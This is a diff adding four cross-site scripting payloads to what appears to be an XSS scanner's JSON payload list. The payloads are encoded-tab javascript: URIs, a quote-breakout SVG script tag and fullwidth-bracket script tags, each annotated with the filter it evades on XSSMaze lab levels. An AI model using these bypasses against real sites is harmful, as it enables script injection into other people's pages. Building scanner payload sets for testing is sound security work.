@@ -478,6 +478,50 @@
       "note": "Base64 data: URI"
     },
     {
+      "id": "url-008",
+      "context": "url_href",
+      "tags": [
+        "uri",
+        "encoded-tab"
+      ],
+      "confidence": "high",
+      "payload": "java&#x09;script:alert(1)",
+      "note": "Phase 363: the tab must split the scheme AFTER 'java' (the existing url-007 entry puts it inside 'avascript', which decodes to an invalid scheme). XSSMaze inframe/level3-4 reflect the value into an iframe src= and confirm on this shape."
+    },
+    {
+      "id": "url-009",
+      "context": "url_href",
+      "tags": [
+        "uri",
+        "encoded-tab",
+        "no-alert"
+      ],
+      "confidence": "high",
+      "payload": "java&#x09;script:confirm(1)",
+      "note": "Phase 363: same encoded-tab scheme, phrased with confirm() for sinks that strip the bare word 'alert' while leaving other calls intact (measured XSSMaze inframe/level4)."
+    },
+    {
+      "id": "attr-name-noeq-001",
+      "context": "url_href",
+      "tags": [
+        "no_equals_breakout",
+        "quote_breakout"
+      ],
+      "confidence": "high",
+      "payload": "'><svg><script>alert(1)</script></svg>",
+      "note": "Phase 363: for an attribute-NAME injection point that strips '=' (XSSMaze attrname/level4) no handler can be assigned, so close the enclosing tag with '> and start a script-bearing element that needs no '='."
+    },
+    {
+      "id": "unicode-fullwidth-001",
+      "context": "html_element",
+      "tags": [
+        "unicode_normalize"
+      ],
+      "confidence": "high",
+      "payload": "＜script＞alert(1)＜/script＞",
+      "note": "Phase 363: a sink that strips ASCII angle brackets and then NFKC-normalises turns fullwidth brackets into real ones (XSSMaze unicode/level2). Tagged attr_name_injection so it rides the bracket-dead surfacing path -- it is inert as reflected text and costs a slot only where brackets are provably dead."
+    },
+    {
       "id": "url-007",
       "context": "url_javascript",
       "tags": [
